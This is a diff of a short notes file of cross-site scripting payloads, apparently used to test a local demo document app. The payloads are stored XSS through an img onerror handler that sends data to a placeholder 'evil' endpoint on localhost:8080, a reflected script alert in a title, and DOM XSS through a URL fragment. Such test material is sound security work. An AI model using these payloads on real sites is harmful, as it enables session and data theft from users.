@@ -1,18 +1,17 @@
-<p>Legen-wait-for-it-dary! <img src="foobar.jpg" onerror="$.getJSON('http://localhost:8080/evil?data=user data')"></p>
+#----
+# create a document with an error handler
+#----
+content = "<p>Legen-wait-for-it-dary! <img src=\"foobar.jpg\" onerror=\"$.getJSON('http://localhost:8080/evil?data=persistent xss')\">";
+
+#----
+# create a title containing a reflected script
+#----
+Test title <script>alert('reflected XSS');</script>
+
+#----
+# Create a link to document with dom xssed title
+#----
+http://localhost:9000/#documents/Test title <script>alert('reflected XSS');</script>
 
 
-#------
-# create with sending message
-#------
-content = "<p>Legen-wait-for-it-dary! <img src=\"foobar.jpg\" onerror=\"$.getJSON('http://localhost:8080/evil?data=user data')\">";
-
-#-----
-# create with executing some data
-#-----
-content = "<p><a href=\"http://localhost:9000/#documents/<img src=\"foobar.jpg\" onerror=\"alert('XSS')">">See this awesome doc!</a></p>";
-
-#-----
-# DOM XSS
-#-----
-http://localhost:9000/#documents/<script>alert('aksjdhakdsjhaskjdh')</script>
-$.getJSON&lpar;'http://localhost:8080/evil?data=user data'$rpar;
+#
